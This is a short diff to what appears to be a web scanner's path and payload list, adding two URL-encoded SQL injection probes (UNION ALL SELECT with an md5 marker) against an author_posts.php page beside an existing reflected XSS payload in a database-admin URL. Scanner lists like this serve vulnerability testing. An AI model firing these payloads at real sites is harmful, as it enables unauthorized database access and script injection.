@@ -6,3 +6,5 @@
 /?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /sqlite/
 /sqlitemanager/
+/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
+/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
